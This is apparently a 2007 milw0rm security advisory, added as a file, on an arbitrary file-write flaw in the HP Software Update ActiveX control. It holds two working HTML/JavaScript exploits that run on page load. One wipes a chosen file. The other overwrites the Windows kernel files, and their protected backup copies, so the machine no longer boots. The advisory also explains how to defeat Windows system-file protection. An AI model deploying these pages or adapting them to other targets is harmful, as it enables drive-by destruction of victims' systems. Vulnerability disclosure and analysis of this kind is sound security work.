@@ -1,0 +1,185 @@
+Advisory: ///////// 
+
+There is another remotely exploitable flaw within software preinstalled 
+in HP notebook machines. This time, the culprit is automatic software 
+update tool provided by the vendor.The Potential exploitation may lead 
+to user files loss or altering vital system files (e.g. kernel), thus 
+leaving PC unbootable. 
+
+Overview: ///////// 
+
+The flaw is located in the software called HP Software Update shipped 
+with the HP notebooks to support automatic software updates and critical 
+vulnerability patching. One of the ActiveX controls deployed by default 
+by the vendor contains an insecure method giving a potential attacker 
+the remote system arbitrary file write access. 
+
+Impact: /////// 
+
+Remote user files contents corruption Remote system kernel files damage 
+/ Operating System DoS condition 
+
+Attack vectors: /////////////// 
+
+There are two main attack vector schemes: 
+
+- inducing remote user to launch WWW link after obtaining the 
+information about the location of an arbitrary file(s) locations/names 
+in the remote system. After clicking the link the files contents will be 
+unrecoverably destroyed. This attack vector thus requires additional 
+social engineering of the vitim to acquire exact name and location of 
+the potential attack target files. - inducing remote user to launch WWW 
+link resulting in corruption of vital Operating System files, leaving 
+the system unusable. This attack vector DOESN'T require any additional 
+victim social engineering, because the system files are always placed in 
+the predictable locations. 
+
+Technical details: ////////////////// 
+
+The vulnerable ActiveX control EngineRules.dll is a component of HP 
+Software Updates system designed by the vendor. 
+
+It has assigned CLSID: 7CB9D4F5-C492-42A4-93B1-3F7D6946470D and is by 
+default included to "Safe for Scripting" OLE components, that allows 
+full execution scripting access to the control methods from within the 
+browser. 
+
+The default control installation path is C:\Program 
+Files\Hewlett-Packard\eSupportDiags\RulesEngine.dll 
+
+The control is used by the the HP Software Updates software's 
+HPWUCli.exe client application to enumerate, load and store available 
+software patches information. The HPWUCli.exe binary is located in the 
+directory: C:\Program Files\HP\HP Software Update\ 
+
+The control may also be used by a remote WWW service, such as 
+Hewlett-Packard online software update service. 
+
+The potentialy insecure method is: void SaveToFile(String dataFilePath); 
+
+This method is used to store the software patch specific data (version, 
+remote location, vendor name, software description) in the binary file 
+beginning with the 32bit integer value containing the actual patches 
+count stored in the data file. 
+
+The problem lies in the lack of distinguish between local and global 
+data file area in this control. Both LoadDataFromFile() method and 
+SaveDataToFile() method have an access to the entire file system data 
+area, therefore any arbitrary user file can be accessed remotely using 
+one of these methods by a remote entity. Use the SaveDataToFile() can be 
+exploited to store the empty-by-initialize software patch data in the 
+existing file, which will result in previous file contents loss and 
+resetting it to 4 zero-bytes, describing a zero-size patch. 
+
+Noticing a specific vulnerability location (vendor's software update 
+system), simple disabling of the vulnerable control by the vendor's 
+patch (like in the other HP software vulnerbility case - HPInfo) would 
+result in the machine software update system compromise in this case and 
+would leave the user vulnerable to the future security issues. 
+
+Therefore reimplemetation of the update system and/or vulnerable control 
+local data area implementation is strongly recommended. 
+
+Remote Kernel Wreckage Exploit ////////////////////////////// 
+
+Using this flaw one can construct an armed exploit, able for example to 
+destroy remote system kernel files and make the remote machine 
+UNBOOTABLE. The exploit is using vulnerable SaveToFile() to overwrite 
+the NT System kernel files with the 4 zero bytes. The target are memory 
+mapped ntoskrnl.exe and ntkrnlpa.exe kernel files which don't have a 
+write lock set on them and may be opened for write. Although Windows NT 
+system contains a protection for this kind of activity (system files 
+overwrite) it can be fooled by overwriting simultanously: system binary 
+files backup directory (\System32\DllCache\) actual system kernel files 
+(\System32\) and the Driver Backup directory (\Windows\Driver Cache\) 
+kernel files. 
+
+After the execution it will store an zero-initialized patch information 
+using SaveToFile() method sequentially to ntoskrnl.exe, ntkrnlpa.exe, 
+ntkrnlmp.exe ,ntkrpamp.exe NT kernel files , first in the 
+System32\DllCache\ directory, second to \System32\ directory and finally 
+to Windows\Driver Cache\ dir. After the very next OS shutdown, machine 
+will not be bootable anymore. 
+
+The exploit code has been attached to the end of this advisory. NOTE 
+however that it is provided ONLY as a Proof of Concept code and has been 
+released ONLY to estimate the impact level of the issue. 
+
+Vulnerable Software: //////////////////// 
+
+HP Software Update client v3.0.8.4 RulesEngine.dll ActiveX CTL v1.0 
+
+Internet Explorer 6.0 Internet Explorer 7.0 
+
+Windows XP Home Windows XP Pro Windows 2000 Windows 2003 Windows Vista 
+
+Vulnerable Hardware /////////////////// 
+
+Every HP notebook machine containing the HP Software Updates application 
+is vulnerable. It is possible that the vulnerable machine model list 
+disclosed by the vendor as a confirmation to the previous issue 
+concerning HP laptops - "HP Info Center" case, will be similar in this 
+case. 
+
+Exploits: ///////// 
+
+////////////////////////////////////////// //Remote Arbitrary File Corruption Exploit ////////////////////////////////////////// 
+
+<html> <head> <script language="JavaScript"> 
+
+var filePath="c:\\temp\\testfile.txt"; 
+
+function spawn3() { o2obj.SaveToFile(filePath); } 
+
+</script> </head> 
+
+<body onload="spawn3()"> <object ID="o2obj" WIDTH=0 HEIGHT=0 classid="clsid:7CB9D4F5-C492-42A4-93B1-3F7D6946470D" </object> </body> 
+</html> 
+
+//////////////////////////////// //Remote Kernel Wreckage Exploit  //////////////////////////////// // // // WARNING! THE REAL THING... // 
+DON'T TRY THIS AT HOME! // THIS WILL DAMAGE YOUR // HP COMPUTER SYSTEM!!! // // //////////////////////////////// 
+
+<html> <head> <script language="JavaScript"> 
+
+function spawn3() { 
+
+o2obj.EvaluateRules(); 
+
+o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntoskrnl.exe"); 
+o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntkrnlpa.exe"); 
+o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntkrnlmp.exe"); 
+o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntkrpamp.exe"); 
+
+o2obj.SaveToFile("c:\\WINDOWS\\system32\\ntoskrnl.exe"); 
+o2obj.SaveToFile("c:\\WINDOWS\\system32\\ntkrnlpa.exe"); 
+
+o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntoskrnl.exe"); 
+o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlpa.exe"); 
+o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlmp.exe"); 
+o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntkrpamp.exe"); 
+
+o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\sp2.cab"); 
+o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\driver.cab"); } 
+
+function meltdown() { spawn3(); spawn3(); spawn3(); } 
+
+</script> </head> 
+
+<body onload="meltdown()"> <object ID="o2obj" WIDTH=0 HEIGHT=0 
+classid="clsid:7CB9D4F5-C492-42A4-93B1-3F7D6946470D" </object> </body> 
+</html> 
+
+Related final word: /////////////////// 
+
+Spiderpig, spiderpig, does whatever the spiderpig does... ;-) 
+
+Links: ////// 
+
+Original advisory link: 
+www.anspi.pl/~porkythepig/hp-issue/wyfukanyszynszyl.txt 
+
+Credits: //////// 
+
+Issue discovery and research: porkythepig Contact: porkythepig@anspi.pl 
+
+# milw0rm.com [2007-12-19]
